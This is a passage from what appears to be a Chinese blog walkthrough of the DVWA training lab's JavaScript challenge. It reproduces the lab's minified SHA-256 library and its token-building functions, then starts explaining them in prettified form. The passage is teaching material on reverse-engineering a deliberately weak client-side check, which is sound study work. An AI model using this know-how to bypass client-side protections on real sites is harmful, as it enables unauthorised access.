class="nx">sharedMemory&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">key&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;string&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">bytes&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[],&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">charCodeAt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mh">0x800&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xc0&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mh">0xd800&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mh">0xe000&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xe0&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x10000&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3ff&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">charCodeAt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3ff&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xf0&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))}}&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ERROR&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ARRAY_BUFFER&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constructor&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">Uint8Array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nb">Array&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isArray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">ARRAY_BUFFER&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isView&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ERROR&lt;/span>&lt;span class="p">)}}}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ERROR&lt;/span>&lt;span class="p">)}}&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">Sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">array&lt;/span>&lt;span class="p">()}&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">oKeyPad&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[],&lt;/span>&lt;span class="nx">iKeyPad&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[];&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">oKeyPad&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x5c&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">iKeyPad&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x36&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">sharedMemory&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">iKeyPad&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">oKeyPad&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">oKeyPad&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">inner&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sharedMemory&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">sharedMemory&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">HmacSha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">Sha256&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">HmacSha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalize&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalize&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">inner&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">inner&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">innerHash&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">array&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sharedMemory&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">oKeyPad&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">innerHash&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalize&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">)}};&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">exports&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createMethod&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha256&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha224&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hmac&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createHmacMethod&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha224&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hmac&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createHmacMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">COMMON_JS&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">module&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha256&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha256&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha224&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sha224&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">AMD&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">exports&lt;/span>&lt;span class="p">})}}})();&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">do_something&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">t&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">t&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">token_part_3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ZZ&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;token&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;token&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">token_part_2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;YY&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;token&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;token&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">token_part_1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;token&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">do_something&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;phrase&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;phrase&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">token_part_2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;XX&amp;#34;&lt;/span>&lt;span class="p">)},&lt;/span>&lt;span class="mi">300&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;send&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;click&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">token_part_3&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">token_part_1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ABCD&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>美化一下代码再观察。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429113106394.png"
width="705"
height="637"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429113106394_hu5e5710509d4301b9ba1243a6369c5388_92339_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429113106394_hu5e5710509d4301b9ba1243a6369c5388_92339_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429113106394"
class="gallery-image"
data-flex-grow="110"
data-flex-basis="265px"
>&lt;/p>
&lt;p>第一个立即函数是 SHA256 的实现，忽略。后续内容很清晰：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;phrase&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">token_part_2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;XX&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="mi">300&lt;/span>&lt;span class="p">);&lt;/span>
